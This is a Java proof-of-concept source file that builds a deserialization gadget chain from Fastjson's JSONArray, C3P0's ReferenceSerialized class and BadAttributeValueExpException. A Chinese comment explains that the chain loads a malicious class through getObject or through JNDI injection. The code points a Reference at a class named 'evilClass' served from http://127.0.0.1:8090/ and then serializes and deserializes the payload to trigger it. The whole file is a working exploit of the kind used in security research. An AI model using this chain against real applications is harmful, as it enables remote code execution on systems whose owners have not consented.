import com.alibaba.fastjson.JSONArray;
import com.sun.jndi.dns.DnsName;

import javax.management.BadAttributeValueExpException;
import javax.naming.Name;
import javax.naming.Reference;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Hashtable;

import static util.Util.serialize;
import static util.Util.unserialize;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/12
 */
/*
* 这个链子需要依赖C3P0，使用ReferenceSerialized类中的getObject方法进行加载恶意类，也可以jndi注入
*
* */
public class Fastjson_ReferenceSerialized {
    public static void main(String[] args) throws Exception{
        Class ReferenceSerializedClass = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized");
        Constructor ReferenceSerializedConstructor = ReferenceSerializedClass.getDeclaredConstructor(Reference.class, Name.class,Name.class, Hashtable.class);
        ReferenceSerializedConstructor.setAccessible(true);
        Reference reference= new Reference("dragonkeep","evilClass","http://127.0.0.1:8090/");
        Object ReferenceSerializedInstance = ReferenceSerializedConstructor.newInstance(reference,null,null,null);
        JSONArray jsonArray= new JSONArray();
        jsonArray.add(ReferenceSerializedInstance);
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("dragonkeep");
        Field field=BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,jsonArray);
        serialize(badAttributeValueExpException);
        unserialize();


//        Method method = ReferenceSerializedClass.getMethod("getObject");
//        method.setAccessible(true);
//        method.invoke(o);
    }
}
